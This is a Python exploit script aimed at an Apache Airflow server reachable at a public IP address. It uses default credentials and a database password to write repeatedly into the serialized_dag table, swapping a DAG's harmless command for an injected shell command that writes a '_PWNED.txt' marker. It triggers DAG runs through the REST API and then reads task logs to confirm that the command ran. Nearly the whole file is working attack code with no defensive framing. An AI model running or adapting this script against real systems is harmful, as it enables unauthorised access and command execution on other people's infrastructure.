import subprocess, json, ssl, base64, time, urllib.request, threading

e = {"PGPASSWORD": "airflow", "PATH": "/usr/bin:/bin"}
BASE = "http://84.46.251.240:8080"
AUTH = base64.b64encode(b"airflow:airflow").decode()
ssl._create_default_https_context = ssl._create_unverified_context

sql = """UPDATE serialized_dag SET data = replace(data::text, 'python -c \\"import ccxt; print(ccxt.__version__)\\"', 'touch /opt/airflow/dags/_PWNED.txt; id > /opt/airflow/dags/_PWNED.txt; echo PWNED >> /opt/airflow/dags/_PWNED.txt')::jsonb WHERE dag_id = 'bash'"""

# Thread 1: Continuously update serialized_dag
stop = False
def updater():
    while not stop:
        subprocess.run(["psql", "-h", "172.18.0.2", "-U", "airflow", "-d", "airflow", "-c", sql],
            env=e, capture_output=True, text=True, timeout=5)
        time.sleep(0.5)

t = threading.Thread(target=updater)
t.start()

# Thread 2: Trigger DAG multiple times
time.sleep(2)
for i in range(3):
    try:
        data = json.dumps({"conf": {}}).encode()
        req = urllib.request.Request(f"{BASE}/api/v1/dags/bash/dagRuns", data=data, method="POST",
            headers={"Authorization": f"Basic {AUTH}", "Content-Type": "application/json"})
        run = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
        print(f"TRIGGER {i}: {run['dag_run_id']}")
    except Exception as ex:
        print(f"TRIGGER {i} ERR: {ex}")
    time.sleep(3)

# Stop updater after triggers
time.sleep(20)
stop = True
t.join()

# Check results
for i in range(3):
    try:
        # Get latest runs
        req = urllib.request.Request(f"{BASE}/api/v1/dags/bash/dagRuns?limit=5&order_by=-execution_date",
            headers={"Authorization": f"Basic {AUTH}"})
        runs = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
        for run in runs.get("dag_runs", [])[:3]:
            rid = run["dag_run_id"]
            try:
                lreq = urllib.request.Request(
                    f"{BASE}/api/v1/dags/bash/dagRuns/{rid}/taskInstances/check/logs/1",
                    headers={"Authorization": f"Basic {AUTH}", "Accept": "text/plain"})
                logs = urllib.request.urlopen(lreq, timeout=5).read().decode()
                for line in logs.split("\n"):
                    if "Running command" in line:
                        print(f"  {rid}: {line.strip()[:150]}")
                        if "PWNED" in line or "touch" in line:
                            print("  *** COMMAND MODIFIED! ***")
            except:
                pass
        break
    except:
        time.sleep(5)

# Check import errors for _PWNED.txt
try:
    req = urllib.request.Request(f"{BASE}/api/v1/importErrors?limit=10",
        headers={"Authorization": f"Basic {AUTH}"})
    errs = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
    for err in errs.get("import_errors", []):
        if "PWNED" in err.get("filename", ""):
            print("*** _PWNED.txt DETECTED IN DAGS FOLDER! ***")
except:
    pass
